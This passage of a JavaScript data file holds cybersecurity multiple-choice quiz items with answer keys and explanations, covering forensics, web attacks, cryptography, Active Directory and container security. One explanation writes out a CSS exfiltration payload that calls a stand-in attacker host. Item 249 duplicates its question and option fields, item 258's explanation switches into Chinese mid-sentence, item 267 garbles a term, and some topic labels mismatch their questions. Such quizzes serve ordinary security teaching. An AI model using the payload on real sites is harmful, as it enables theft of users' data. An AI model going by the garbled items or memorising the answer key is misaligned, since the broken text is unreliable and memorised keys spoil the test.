            "To prosecute the attacker"
        ],
        answer: 1,
        explanation: "Containment aims to isolate affected systems (e.g., disconnecting from the network) to stop the bleeding and prevent the attacker from moving laterally or exfiltrating more data.",
        difficulty: "Medium",
        topic: "Incident Response"
    },
    {
        id: "cyber_security-211",
        question: "In digital forensics, what is the primary reason for creating a bit-by-bit (forensic) image of a hard drive instead of just copying files?",
        options: [
            "It is faster",
            "It captures deleted files, file system metadata, and slack space, preserving the complete state for evidence",
            "It compresses the data to save space",
            "It automatically decrypts encrypted files"
        ],
        answer: 1,
        explanation: "A bit-by-bit image captures the entire physical drive, including unallocated space and deleted files, which standard file copying ignores. This is crucial for maintaining forensic integrity.",
        difficulty: "Medium",
        topic: "Digital Forensics"
    },
    {
        id: "cyber_security-212",
        question: "What does the 'chain of custody' refer to in digital forensics?",
        options: [
            "The sequence of network routers a packet passes through",
            "The documented, unbroken trail of accountability ensuring that physical and digital evidence is handled properly",
            "The cryptographic chain of certificates",
            "The sequence of commands an attacker ran"
        ],
        answer: 1,
        explanation: "The chain of custody documents who handled the evidence, when, and where. If this chain is broken, the evidence may be deemed inadmissible in court.",
        difficulty: "Medium",
        topic: "Digital Forensics"
    },
    {
        id: "cyber_security-213",
        question: "What is the difference between a Security Audit and a Penetration Test?",
        options: [
            "A penetration test exploits vulnerabilities; a security audit is a systematic evaluation of an organization's security policies, procedures, and controls",
            "They are the same thing",
            "A security audit is always automated",
            "A penetration test is only done by internal employees"
        ],
        answer: 0,
        explanation: "While a pentest is a technical exercise to find exploitable flaws, an audit is a comprehensive review of the security program, often including policy compliance and physical security.",
        difficulty: "Medium",
        topic: "Security Auditing"
    },
    {
        id: "cyber_security-214",
        question: "An application uses an XML parser to process user-supplied data. An attacker submits malicious XML that causes the parser to make external requests to internal systems. What is this attack?",
        options: [
            "SQL Injection",
            "XXE (XML External Entity) Injection",
            "XSS",
            "CSV Injection"
        ],
        answer: 1,
        explanation: "XXE attacks exploit vulnerable XML parsers that process external entity references, allowing attackers to read local files, execute SSRF, or cause Denial of Service.",
        difficulty: "Medium",
        topic: "XPath Injection"
    },
    {
        id: "cyber_security-215",
        question: "What is Mass Assignment in the context of API security?",
        options: [
            "Sending a large volume of API requests",
            "Binding user-supplied data directly to internal object properties, allowing an attacker to modify fields they shouldn't (e.g., 'isAdmin': true)",
            "Assigning multiple users to a single role",
            "Encrypting all data in the database"
        ],
        answer: 1,
        explanation: "Mass assignment occurs when an API automatically maps input fields to database columns. If an attacker guesses a sensitive field name (like 'role' or 'balance'), they can update it.",
        difficulty: "Medium",
        topic: "OWASP API Top 10"
    },
    {
        id: "cyber_security-216",
        question: "A web application allows users to upload profile pictures. An attacker uploads a file named `image.php.jpg` containing PHP code. The server executes it when accessed. What went wrong?",
        options: [
            "The file size was too large",
            "Lack of proper file type validation (e.g., checking magic bytes) and secure storage configuration",
            "The file was not encrypted",
            "The database was not backed up"
        ],
        answer: 1,
        explanation: "Relying solely on the file extension is insufficient. The server must validate the file's actual content (magic bytes) and ensure uploaded files are stored outside the web root or executed as static data.",
        difficulty: "Medium",
        topic: "Secure Coding"
    },
    {
        id: "cyber_security-217",
        question: "What is Server-Side Request Forgery (SSRF)?",
        options: [
            "The server forces the client to make a request",
            "An attacker forces the server to make requests to unintended locations, often internal systems",
            "The client spoofs the server's IP address",
            "A type of SQL injection targeting the server"
        ],
        answer: 1,
        explanation: "SSRF occurs when an attacker can control the URL that the server fetches. This can be used to scan internal ports, access cloud metadata, or interact with internal APIs.",
        difficulty: "Medium",
        topic: "OWASP Top 10"
    },
    {
        id: "cyber_security-218",
        question: "In cloud environments, how can an SSRF attack be extremely dangerous due to cloud metadata services?",
        options: [
            "Metadata services provide DDoS protection",
            "Metadata services (like AWS 169.254.169.254) often contain temporary IAM credentials, which an attacker can steal via SSRF",
            "Metadata services block malicious IPs",
            "Metadata services automatically patch the server"
        ],
        answer: 1,
        explanation: "Cloud instances can query a local metadata IP to get IAM roles. An SSRF vulnerability allows an attacker to query this IP and steal the instance's cloud credentials.",
        difficulty: "Medium",
        topic: "Cloud Security"
    },
    {
        id: "cyber_security-219",
        question: "What is the primary risk of using `eval()` in JavaScript to parse JSON data?",
        options: [
            "It is slower than standard parsers",
            "It will throw an error on valid JSON",
            "It executes any JavaScript code contained in the string, leading to Remote Code Execution or XSS",
            "It truncates long strings"
        ],
        answer: 2,
        explanation: "`eval()` interprets the string as JavaScript code. If the JSON data is tainted by an attacker, it can contain malicious JavaScript that `eval()` will execute.",
        difficulty: "Medium",
        topic: "Secure Coding"
    },
    {
        id: "cyber_security-220",
        question: "An application uses `XMLHttpRequest` or `fetch` to make requests to a different domain. The browser blocks the request. What security mechanism is enforcing this?",
        options: [
            "CORS (Cross-Origin Resource Sharing)",
            "CSRF protection",
            "CSP (Content Security Policy)",
            "WAF"
        ],
        answer: 0,
        explanation: "Browsers enforce the Same-Origin Policy by default. CORS is the mechanism that allows a server to relax this policy, and the browser blocks the request if CORS headers are missing.",
        difficulty: "Medium",
        topic: "CORS"
    },
    {
        id: "cyber_security-221",
        question: "What is the security implication of a CORS misconfiguration that reflects the `Origin` header in the `Access-Control-Allow-Origin` response?",
        options: [
            "It blocks all cross-origin requests",
            "It allows any domain that makes a request to read the response, effectively defeating the Same-Origin Policy",
            "It causes a syntax error in the browser",
            "It encrypts the response"
        ],
        answer: 1,
        explanation: "If the server blindly reflects the origin (e.g., `Access-Control-Allow-Origin: [attacker.com]`), any malicious site can make authenticated requests and read the sensitive data returned.",
        difficulty: "Medium",
        topic: "CORS"
    },
    {
        id: "cyber_security-222",
        question: "A developer uses a custom encryption algorithm instead of a standard like AES. What is the primary security concern?",
        options: [
            "It will be too slow",
            "It violates intellectual property laws",
            "It has not been subjected to extensive public cryptanalysis and likely contains fatal flaws",
            "It cannot be decrypted"
        ],
        answer: 2,
        explanation: "Cryptographic algorithms must be rigorously tested by the global security community. Custom, proprietary algorithms almost always contain weaknesses that experts would have caught.",
        difficulty: "Medium",
        topic: "Encryption"
    },
    {
        id: "cyber_security-223",
        question: "What is the purpose of an Initialization Vector (IV) or Nonce in symmetric encryption?",
        options: [
            "To increase the key length",
            "To ensure that the same plaintext encrypted with the same key produces different ciphertext each time",
            "To store the encryption algorithm name",
            "To authenticate the sender"
        ],
        answer: 1,
        explanation: "Without an IV, encrypting the same block of text with the same key yields the same ciphertext, leaking patterns. The IV randomizes the starting state to prevent this.",
        difficulty: "Medium",
        topic: "Symmetric Encryption"
    },
    {
        id: "cyber_security-224",
        question: "A certificate has an validity period of '2023-01-01 to 2024-01-01'. If a user tries to establish a connection on '2024-01-02', what will happen?",
        options: [
            "The connection will succeed but be unencrypted",
            "The client will reject the certificate because it has expired",
            "The CA will automatically renew the certificate",
            "The browser will prompt the user to extend the date"
        ],
        answer: 1,
        explanation: "Certificates have strict validity periods. Once expired, clients will refuse to trust the certificate, resulting in a connection error.",
        difficulty: "Medium",
        topic: "Certificates"
    },
    {
        id: "cyber_security-225",
        question: "What is a Self-Signed Certificate?",
        options: [
            "A certificate signed by a public CA for free",
            "A certificate signed by the entity that created it, rather than a trusted third-party CA",
            "A certificate without a private key",
            "A certificate that automatically signs other certificates"
        ],
        answer: 1,
        explanation: "Self-signed certificates are created and signed by the same entity. Browsers do not trust them by default because there is no third-party CA to validate the entity's identity.",
        difficulty: "Medium",
        topic: "Certificates"
    },
    {
        id: "cyber_security-226",
        question: "In a typical enterprise SOC, what triggers a Tier 1 analyst to escalate a ticket to Tier 2?",
        options: [
            "Any alert from the firewall",
            "A confirmed or highly complex threat that requires deeper technical analysis and threat hunting",
            "A user resetting their password",
            "A scheduled vulnerability scan"
        ],
        answer: 1,
        explanation: "Tier 1 handles initial triage. If an alert requires reverse engineering malware, analyzing network pcaps, or complex correlation, it is escalated to Tier 2 for in-depth investigation.",
        difficulty: "Medium",
        topic: "SOC"
    },
    {
        id: "cyber_security-227",
        question: "What is the MITRE ATT&CK framework primarily used for?",
        options: [
            "Encrypting network traffic",
            "Categorizing and describing adversarial tactics, techniques, and procedures (TTPs) based on real-world observations",
            "Scanning for vulnerabilities",
            "Managing firewall rules"
        ],
        answer: 1,
        explanation: "MITRE ATT&CK is a globally-accessible knowledge base of adversary tactics and techniques based on real-world incidents, used to develop detection analytics and threat models.",
        difficulty: "Medium",
        topic: "Threat Modeling"
    },
    {
        id: "cyber_security-228",
        question: "An attacker uses a tool like `Mimikatz`. What are they most likely trying to do?",
        options: [
            "Scan for open ports",
            "Extract plaintext passwords, hashes, or Kerberos tickets from memory",
            "Perform a DDoS attack",
            "Crack Wi-Fi passwords"
        ],
        answer: 1,
        explanation: "Mimikatz is a post-exploitation tool commonly used to extract credentials from memory (LSASS) on Windows systems, enabling lateral movement.",
        difficulty: "Medium",
        topic: "Post Exploitation"
    },
    {
        id: "cyber_security-229",
        question: "What is 'Pass-the-Hash' attack?",
        options: [
            "Sending a hash via email",
            "Using a captured password hash to authenticate directly to a system without cracking the hash to plaintext",
            "A type of blockchain attack",
            "Breaking a hash using rainbow tables"
        ],
        answer: 1,
        explanation: "In Windows authentication protocols (like NTLM), the server validates the hash, not the plaintext. Attackers can capture the hash from memory or network traffic and replay it.",
        difficulty: "Medium",
        topic: "Lateral Movement"
    },
    {
        id: "cyber_security-230",
        question: "Which protocol is often targeted in enterprise environments for 'Pass-the-Ticket' attacks?",
        options: [
            "LDAP",
            "Kerberos",
            "RADIUS",
            "OAuth"
        ],
        answer: 1,
        explanation: "Kerberos uses Tickets (TGTs and service tickets) for authentication. Attackers can extract these tickets from memory (e.g., via Mimikatz) and reuse them on other systems.",
        difficulty: "Medium",
        topic: "Lateral Movement"
    },
    {
        id: "cyber_security-231",
        question: "What is the purpose of DNS over HTTPS (DoH)?",
        options: [
            "To encrypt web traffic",
            "To encrypt DNS queries and responses, preventing eavesdropping and manipulation by ISPs or intermediaries",
            "To block malicious domains",
            "To speed up DNS resolution"
        ],
        answer: 1,
        explanation: "DoH sends DNS queries inside an encrypted HTTPS connection, preventing third parties from seeing which websites a user is trying to resolve.",
        difficulty: "Medium",
        topic: "DNS Security"
    },
    {
        id: "cyber_security-232",
        question: "What is a 'Cache Poisoning' attack specific to DNS?",
        options: [
            "Deleting the DNS cache",
            "Injecting fraudulent IP addresses into the DNS resolver's cache so future requests return the malicious IP",
            "Overloading the DNS server with queries",
            "Changing the DNS server's IP address"
        ],
        answer: 1,
        explanation: "Cache poisoning exploits flaws in DNS resolvers to trick them into storing and serving a malicious IP address for a legitimate domain name.",
        difficulty: "Medium",
        topic: "DNS Spoofing"
    },
    {
        id: "cyber_security-233",
        question: "What is a Proxy Firewall?",
        options: [
            "A firewall that only inspects HTTP traffic",
            "A firewall that acts as an intermediary, intercepting traffic, inspecting it deeply, and forwarding it on behalf of the client",
            "A hardware firewall",
            "A firewall that blocks all traffic by default"
        ],
        answer: 1,
        explanation: "Proxy firewalls (Application-level gateways) break the connection between the client and server, inspecting the entire payload at the application layer before forwarding it.",
        difficulty: "Medium",
        topic: "Firewall"
    },
    {
        id: "cyber_security-234",
        question: "In a Next-Generation Firewall (NGFW), what capabilities does it have that a traditional stateful firewall lacks?",
        options: [
            "Only packet filtering",
            "Deep packet inspection (DPI), application awareness, and integrated IPS",
            "Only VPN support",
            "Lower latency"
        ],
        answer: 1,
        explanation: "NGFWs combine traditional firewall capabilities with advanced features like DPI to look inside packets, application-level awareness to block apps like BitTorrent, and built-in IPS.",
        difficulty: "Medium",
        topic: "Firewall"
    },
    {
        id: "cyber_security-235",
        question: "An anomaly-based IDS flags a massive spike in DNS requests from a single workstation at 3 AM. What is the most likely cause?",
        options: [
            "A user watching a streaming video",
            "The workstation is potentially compromised and participating in a DNS tunneling exfiltration or DDoS amplification attack",
            "A normal software update",
            "The DNS server is down"
        ],
        answer: 1,
        explanation: "A sudden, massive spike in DNS queries from a single host is highly abnormal and often indicates DNS tunneling (data exfiltration) or an amplifier attack.",
        difficulty: "Medium",
        topic: "IDS"
    },
    {
        id: "cyber_security-236",
        question: "Why are endpoint detection tools moving away from purely signature-based detection?",
        options: [
            "Signatures take up too much disk space",
            "The volume of new, unique malware (zero-days) makes it impossible to write signatures fast enough",
            "Signatures slow down the CPU",
            "Cloud computing makes signatures obsolete"
        ],
        answer: 1,
        explanation: "Signature-based detection is reactive. With thousands of new malware variants created daily, behavioral and machine-learning based detection is necessary to catch novel threats.",
        difficulty: "Medium",
        topic: "Endpoint Security"
    },
    {
        id: "cyber_security-237",
        question: "What is the security risk of enabling 'USB Debugging' on an Android mobile device?",
        options: [
            "It drains the battery faster",
            "It allows a connected computer to execute commands, access files, and install apps without user consent",
            "It prevents OTA updates",
            "It disables the screen lock"
        ],
        answer: 1,
        explanation: "USB debugging (ADB) bypasses normal security boundaries, giving a connected host deep system-level access, which is risky if connected to a compromised or untrusted PC.",
        difficulty: "Medium",
        topic: "Endpoint Security"
    },
    {
        id: "cyber_security-238",
        question: "A user receives an email from 'support@bank0famerica.com' (with a zero instead of an 'o'). What social engineering principle makes this potentially effective?",
        options: [
            "Urgency",
            "Authority",
            "Visual deception / Typo squatting",
            "Reciprocity"
        ],
        answer: 2,
        explanation: "Attackers use visually similar characters (like 0 for O, or rn for m) to trick users who are skimming quickly into believing the domain is legitimate.",
        difficulty: "Medium",
        topic: "Phishing"
    },
    {
        id: "cyber_security-239",
        question: "In the context of ISO 27001, what is an Information Security Management System (ISMS)?",
        options: [
            "A software tool for managing firewalls",
            "A systematic approach to managing sensitive company information, including policies, procedures, and controls",
            "A physical safe for storing paper documents",
            "A type of antivirus software"
        ],
        answer: 1,
        explanation: "An ISMS is a framework of policies and procedures that includes all legal, physical, and technical controls involved in an organization's information risk management processes.",
        difficulty: "Medium",
        topic: "ISO 27001"
    },
    {
        id: "cyber_security-240",
        question: "A SIEM system is receiving logs but fails to generate alerts for a known attack pattern. What is the most likely configuration issue?",
        options: [
            "The SIEM is turned off",
            "The correlation rules or parsers for that specific log source are missing or misconfigured",
            "The firewall is blocking the SIEM",
            "The internet connection is down"
        ],
        answer: 1,
        explanation: "SIEMs rely on specific parsers to understand log formats and correlation rules to match attack patterns. If these are missing for a new log source, the data is ingested but not analyzed.",
        difficulty: "Medium",
        topic: "SIEM"
    },
    {
        id: "cyber_security-241",
        question: "An attacker exploits a vulnerability in a cryptographic implementation where the system uses a predictable Random Number Generator (RNG) for generating session keys. What is the impact?",
        options: [
            "The session becomes faster",
            "An attacker can mathematically predict the generated keys, breaking the confidentiality of the session",
            "The server crashes",
            "The keys expire immediately"
        ],
        answer: 1,
        explanation: "Cryptography relies on high-entropy, unpredictable random numbers. If the RNG is predictable (e.g., based on a timestamp), an attacker can recreate the keys and decrypt traffic.",
        difficulty: "Hard",
        topic: "Encryption"
    },
    {
        id: "cyber_security-242",
        question: "In TLS 1.3, what is the security risk associated with 0-RTT (Zero Round Trip Time) resumption?",
        options: [
            "It leaks the server's private key",
            "It is vulnerable to replay attacks, as the client sends data immediately without waiting for a server response",
            "It uses weak cipher suites",
            "It is vulnerable to downgrade attacks"
        ],
        answer: 1,
        explanation: "Because 0-RTT allows the client to send application data along with the first handshake message, an attacker who captures this message can replay it to the server.",
        difficulty: "Hard",
        topic: "TLS Handshake"
    },
    {
        id: "cyber_security-243",
        question: "A JWT uses the RSA algorithm with the public key embedded in the header. An attacker changes the algorithm from RS256 to HS256 and uses the public key as the HMAC secret to forge a valid signature. What is this called?",
        options: [
            "JWT None Attack",
            "Algorithm Confusion Attack (Key Confusion)",
            "Cross-Site Scripting",
            "Token Injection"
        ],
        answer: 1,
        explanation: "Algorithm confusion exploits libraries that incorrectly accept the public RSA key as an HMAC symmetric key. The attacker signs the token with HS256 using the public key, which the server verifies.",
        difficulty: "Hard",
        topic: "JWT"
    },
    {
        id: "cyber_security-244",
        question: "An application implements AES-GCM but allows the IV to be static or user-controlled. What is the direct cryptographic consequence?",
        options: [
            "The encryption becomes stronger",
            "The authentication tag can be forged, breaking both confidentiality and integrity",
            "The key length is doubled",
            "It causes a downgrade to ECB mode"
        ],
        answer: 1,
        explanation: "In GCM, reusing an IV with the same key allows an attacker to recover the authentication key (H) and forge valid tags for arbitrary ciphertexts, completely breaking the scheme.",
        difficulty: "Hard",
        topic: "AES"
    },
    {
        id: "cyber_security-245",
        question: "What is a 'Bleichenbacher Attack' primarily associated with?",
        options: [
            "Breaking AES encryption",
            "Padding oracle attacks against RSA PKCS#1 v1.5 encryption",
            "Cracking bcrypt hashes",
            "Exploiting TLS 1.3"
        ],
        answer: 1,
        explanation: "The Bleichenbacher attack is an adaptive chosen-ciphertext attack against RSA encryption when used with PKCS#1 v1.5 padding, exploiting error messages to decrypt ciphertexts.",
        difficulty: "Hard",
        topic: "RSA"
    },
    {
        id: "cyber_security-246",
        question: "In the context of DNSSEC, what is the 'Key Rollover' process, and why is it complex?",
        options: [
            "Changing the DNS records, which causes downtime",
            "Safely transitioning from an old Key Signing Key (KSK) or Zone Signing Key (ZSK) to a new one without breaking validation",
            "Rotating the IP addresses of the DNS servers",
            "Upgrading the DNS server software"
        ],
        answer: 1,
        explanation: "Because DNS uses caching, abruptly changing keys causes validation failures. Rollover requires carefully pre-publishing keys and managing overlap periods to ensure continuous validation.",
        difficulty: "Hard",
        topic: "DNSSEC"
    },
    {
        id: "cyber_security-247",
        question: "A React application uses `dangerouslySetInnerHTML` to render user comments. Even if a CSP is implemented with `script-src 'self'`, what attack might still succeed if the CSP allows `unsafe-inline` for styles?",
        options: [
            "Remote Code Execution",
            "DOM Clobbering to bypass front-end logic",
            "CSS Injection leading to data exfiltration via attribute selectors",
            "SQL Injection"
        ],
        answer: 2,
        explanation: "While JavaScript execution might be blocked, injecting CSS can be used to exfiltrate data. For example, using `input[value^='a'] { background: url(https://attacker.com/a); }` to steal data character by character.",
        difficulty: "Hard",
        topic: "XSS"
    },
    {
        id: "cyber_security-248",
        question: "An attacker discovers a Server-Side Template Injection (SSTI) vulnerability. What is the maximum impact of this flaw?",
        options: [
            "Defacing the website template",
            "Remote Code Execution (RCE) on the underlying server by injecting template syntax that executes system commands",
            "Stealing the template source code",
            "Causing a 404 error"
        ],
        answer: 1,
        explanation: "Template engines (like Jinja2, Twig, Freemaker) often allow executing code within templates. If user input is evaluated as template code, it can lead directly to RCE.",
        difficulty: "Hard",
        topic: "Remote Code Execution"
    },
    {
        id: "cyber_security-249",
        question: "A GraphQL query uses batched/multiple queries in a single request to bypass rate limiting (e.g., sending 100 password reset requests in one HTTP call). What is this bypass called?",
        options: [
            "GraphQL Injection",
            "GraphQL Batching Attack",
            "GraphQL Introspection",
            "GraphQL DoS"
        ],
        answer: 1,
        question: "A GraphQL query uses batched/multiple queries in a single request to bypass rate limiting (e.g., sending 100 password reset requests in one HTTP call). What is this bypass called?",
        options: [
            "GraphQL Injection",
            "GraphQL Batching Attack",
            "GraphQL Introspection",
            "GraphQL DoS"
        ],
        answer: 1,
        explanation: "If rate limiting is applied at the HTTP request layer but not at the GraphQL query resolver layer, an attacker can batch hundreds of destructive queries into a single request to bypass the limit.",
        difficulty: "Hard",
        topic: "GraphQL Security"
    },
    {
        id: "cyber_security-250",
        question: "An API uses the `POST /user` endpoint to create a user, and `GET /user/{id}` to retrieve. An attacker sends `GET /user/../../admin/config`. What is the likely intent?",
        options: [
            "SQL Injection",
            "Path Traversal to access internal API routes or file structures",
            "XSS",
            "CSRF"
        ],
        answer: 1,
        explanation: "Even in REST APIs, if the `{id}` parameter is not validated and is passed directly to a file system or internal routing logic, path traversal sequences can be used to access unintended resources.",
        difficulty: "Hard",
        topic: "Path Traversal"
    },
    {
        id: "cyber_security-251",
        question: "In a heap exploitation scenario, what is a 'Use-After-Free' (UAF) vulnerability?",
        options: [
            "Writing past the end of a heap buffer",
            "Accessing memory that has been freed (deallocated) but not zeroed out, potentially allowing code execution",
            "Failing to free memory, causing a memory leak",
            "Using a variable before initializing it"
        ],
        answer: 1,
        explanation: "UAF occurs when a program continues to use a pointer after the memory it points to has been freed. An attacker can manipulate the heap to replace the freed memory with malicious data.",
        difficulty: "Hard",
        topic: "Heap Overflow"
    },
    {
        id: "cyber_security-252",
        question: "What is Return-Oriented Programming (ROP) primarily used to bypass?",
        options: [
            "Authentication mechanisms",
            "Data Execution Prevention (DEP / NX bit)",
            "Encryption algorithms",
            "Rate limiting"
        ],
        answer: 1,
        explanation: "DEP prevents executing code on the stack or heap. ROP bypasses this by chaining together small code snippets (gadgets) already present in executable memory regions to perform malicious actions.",
        difficulty: "Hard",
        topic: "Buffer Overflow"
    },
    {
        id: "cyber_security-253",
        question: "A browser implements Control Flow Integrity (CFI). How does this mitigate code reuse attacks like ROP?",
        options: [
            "It encrypts the stack",
            "It verifies that indirect branch instructions (like jumps or calls) jump only to valid, expected locations at runtime",
            "It randomizes the heap memory",
            "It adds stack canaries"
        ],
        answer: 1,
        explanation: "CFI ensures that the execution flow of a program follows a predetermined graph. If an ROP chain attempts to jump to an unexpected gadget, CFI will block it.",
        difficulty: "Hard",
        topic: "Stack Overflow"
    },
    {
        id: "cyber_security-254",
        question: "In a race condition attack, an attacker uses 'Signal Handling' to interrupt a privileged process exactly between a permission check and a file operation. What is this specific technique called?",
        options: [
            "TOC/TOU",
            "SYN Race",
            "SIGRACE",
            "Signal-based TOC/TOU exploitation"
        ],
        answer: 3,
        explanation: "By sending a signal (like SIGINT) to a setuid root process precisely during the critical window, an attacker can force the process to execute their own signal handler function with elevated privileges.",
        difficulty: "Hard",
        topic: "Race Conditions"
    },
    {
        id: "cyber_security-255",
        question: "A Linux kernel module allocates memory using `kmalloc` but fails to check the return value for a NULL pointer (out of memory). An attacker triggers this path. What is the likely result?",
        options: [
            "Privilege Escalation via Null Pointer Dereference",
            "Buffer Overflow",
            "SQL Injection",
            "XSS"
        ],
        answer: 0,
        explanation: "In kernel space, a NULL pointer dereference can be mapped to user-controlled memory. If the kernel attempts to write to this NULL address, the attacker can control the data written, leading to arbitrary code execution in kernel mode.",
        difficulty: "Hard",
        topic: "Race Conditions"
    },
    {
        id: "cyber_security-256",
        question: "An AWS IAM policy allows an action on a resource ARN containing a wildcard `*`. However, an attacker discovers they can bypass resource-level restrictions by assuming a role in another account. What IAM concept does this exploit?",
        options: [
            "Role Chaining",
            "Confused Deputy Problem",
            "Cross-Account Polymorphism",
            "Identity-Based Access Control"
        ],
        answer: 1,
        explanation: "The Confused Deputy problem occurs when a service (deputy) is tricked into using its permissions to act on a resource chosen by the caller, which might belong to a different, malicious account.",
        difficulty: "Hard",
        topic: "AWS Security Basics"
    },
    {
        id: "cyber_security-257",
        question: "How can an attacker escape a Docker container running with `--cap-add=SYS_ADMIN` and a mounted Docker socket (`/var/run/docker.sock`)?",
        options: [
            "By exploiting a kernel vulnerability",
            "By interacting with the Docker daemon via the socket to spawn a new privileged container that mounts the host's root filesystem",
            "By cracking the root password inside the container",
            "By modifying the container's iptables"
        ],
        answer: 1,
        explanation: "Mounting the Docker socket gives the container control over the Docker daemon. The attacker can simply send an API request to the daemon to create a new container with `--privileged` and mount the host's `/` directory.",
        difficulty: "Hard",
        topic: "Docker Security"
    },
    {
        id: "cyber_security-258",
        question: "In Kubernetes, what does the 'kube-proxy' component do, and how can its compromise affect cluster security?",
        options: [
            "It manages authentication; compromise leads to identity spoofing",
            "It maintains network rules on nodes; compromise allows an attacker to intercept all pod-to-pod traffic or manipulate iptables for network-based attacks",
            "It schedules pods; compromise leads to resource exhaustion",
            "It stores secrets; compromise leads to credential leakage"
        ],
        answer: 1,
        explanation: "Kube-proxy runs on every node and programs iptables/IPVS rules for services. If compromised, an attacker can alter these rules to redirect traffic,实现跨节点的中间人攻击或网络隔离逃逸.",
        difficulty: "Hard",
        topic: "Kubernetes Security"
    },
    {
        id: "cyber_security-259",
        question: "An attacker gains access to a node in a Kubernetes cluster. They find the service account token mounted in a pod. How do they use this to pivot?",
        options: [
            "They decrypt the token to get the cluster root certificate",
            "They use the token to authenticate to the Kubernetes API server and query for permissions, potentially accessing secrets or creating new pods",
            "They use the token to SSH into other nodes",
            "They present the token to the cloud provider to gain cloud admin access"
        ],
        answer: 1,
        explanation: "Service account tokens are JWTs used for API server authentication. An attacker can use this token to interact with the API, and if the RBAC permissions are overly permissive, pivot across the cluster.",
        difficulty: "Hard",
        topic: "Kubernetes Security"
    },
    {
        id: "cyber_security-260",
        question: "What is a 'Supply Chain Attack' in the context of software development?",
        options: [
            "Attacking the physical delivery of hardware",
            "Compromising a trusted third-party component (like an open-source library or build tool) to inject malware into the final product",
            "Denial of service on the developer's network",
            "Phishing the project manager"
        ],
        answer: 1,
        explanation: "Supply chain attacks target less-secure elements in the software supply chain (e.g., the SolarWinds build server or a malicious npm package) to distribute malware to many downstream victims.",
        difficulty: "Hard",
        topic: "Secure SDLC"
    },
    {
        id: "cyber_security-261",
        question: "How does a 'Typosquatting' attack on a package manager (like npm or PyPI) work?",
        options: [
            "Exploiting a buffer overflow in the package manager",
            "Publishing malicious packages with names very similar to popular, legitimate packages, hoping developers mistype the name during installation",
            "Stealing the credentials of package maintainers",
            "Modifying the package manager's source code"
        ],
        answer: 1,
        explanation: "By publishing a package named `reqeusts` instead of `requests`, attackers rely on human error during `npm install` or `pip install` to execute malicious code automatically during the build process.",
        difficulty: "Hard",
        topic: "DevSecOps"
    },
    {
        id: "cyber_security-262",
        question: "In a digital forensics investigation, an analyst uses `volatility` to analyze a memory dump. What type of artifacts are they most likely looking for that cannot be found on the hard drive?",
        options: [
            "Log files",
            "Running processes, network connections, and decrypted encryption keys in memory",
            "Stored passwords",
            "Browser history"
        ],
        answer: 1,
        explanation: "Volatile memory contains the live state of the system. Decryption keys, plaintext passwords before they are hashed, and active network connections exist only in RAM and disappear on reboot.",
        difficulty: "Hard",
        topic: "Digital Forensics"
    },
    {
        id: "cyber_security-263",
        question: "During an incident response, you discover that an attacker has modified system binaries (e.g., `ls` or `ps`) to hide their processes. What type of rootkit is this?",
        options: [
            "Kernel-mode Rootkit",
            "User-mode Rootkit",
            "Bootkit",
            "Firmware Rootkit"
        ],
        answer: 1,
        explanation: "User-mode rootkits operate at the application layer, often by replacing legitimate binaries with trojanized versions that filter out the attacker's files and processes from the output.",
        difficulty: "Hard",
        topic: "Rootkit"
    },
    {
        id: "cyber_security-264",
        question: "An attacker uses a technique called 'DLL Search Order Hijacking'. How does this execute malicious code?",
        options: [
            "Modifying the PE header of the executable",
            "Placing a malicious DLL with a specific name in a directory that the application searches before the system directory",
            "Injecting code into the running process via WriteProcessMemory",
            "Hooking the IAT in memory"
        ],
        answer: 1,
        explanation: "Windows searches for DLLs in a specific order. If an application is launched from a writable directory (like `C:\\Temp`), an attacker can place a malicious DLL there, and the app will load it instead of the legitimate system DLL.",
        difficulty: "Hard",
        topic: "Malware"
    },
    {
        id: "cyber_security-265",
        question: "What is the primary defense against DLL Search Order Hijacking?",
        options: [
            "Installing an antivirus",
            "Using fully qualified paths for DLLs in the code or enabling SafeDllSearchMode",
            "Disabling the firewall",
            "Encrypting the hard drive"
        ],
        answer: 1,
        explanation: "Specifying the exact path (e.g., `C:\\Windows\\System32\\kernel32.dll`) bypasses the search order entirely. SafeDllSearchMode also helps by prioritizing the System directory over the application directory.",
        difficulty: "Hard",
        topic: "Secure Coding"
    },
    {
        id: "cyber_security-266",
        question: "An attacker performs a 'Kerberoasting' attack. Which accounts are primarily targeted and why?",
        options: [
            "Computer accounts, because they have weak passwords",
            "User accounts with Service Principal Names (SPNs), because their password hashes can be requested by any authenticated user and cracked offline",
            "Domain Admin accounts, because they have the highest privileges",
            "Guest accounts, because they are unmonitored"
        ],
        answer: 1,
        explanation: "Kerberoasting exploits the TGS (Ticket Granting Service) exchange. Any domain user can request a TGS ticket for an SPN. These tickets are encrypted with the service account's password hash, which can be cracked offline.",
        difficulty: "Hard",
        topic: "Lateral Movement"
    },
    {
        id: "cyber_security-267",
        question: "What is 'DCSync' in the context of Active Directory attacks?",
        options: [
            "Synchronizing two domain controllers for high availability",
            "Mimicking the replication process of a Domain Controller to request password hashes of all domain users without needing Domain Admin privileges",
            "Changing the domain password policy",
            "Syncing time between the client and server"
        ],
        answer: 1,
        explanation: "DCSIMON/DCSYNC abuses the DRsUAPI to pretend to be a Domain Controller and request the secret attributes (like NTLM hashes) of accounts, often leading to complete domain compromise.",
        difficulty: "Hard",
        topic: "Privilege Escalation"
    }
]